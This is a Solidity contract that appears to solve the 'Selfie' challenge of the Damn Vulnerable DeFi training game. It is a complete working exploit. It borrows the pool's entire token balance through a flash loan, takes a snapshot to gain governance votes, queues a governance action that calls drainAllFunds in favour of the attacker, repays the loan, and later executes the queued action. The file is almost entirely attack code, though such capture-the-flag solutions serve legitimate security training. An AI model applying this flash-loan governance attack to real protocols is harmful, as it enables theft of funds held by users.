// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {

    ISelfiePool pool;
    ISimpleGovernance simgov;
    DamnValuableTokenSnapshot dvt;
    uint256 actionId;

    function exploit(
        ISelfiePool _pool,
        ISimpleGovernance _simgov,
        DamnValuableTokenSnapshot _dvt
    )  external {
        simgov = _simgov;
        pool = _pool;
        dvt = _dvt;
        dvt.snapshot();
        pool.flashLoan(_dvt.balanceOf(address(pool)));
    }

    function receiveTokens(address _token,uint256 _amount) external {
        dvt.snapshot();
        actionId = simgov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        DamnValuableTokenSnapshot(_token).transfer(address(pool), _amount);  
    }

    function excuteAction() external {
        simgov.executeAction(actionId);
    }
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}
interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
    function getActionDelay() external view returns (uint256);
} 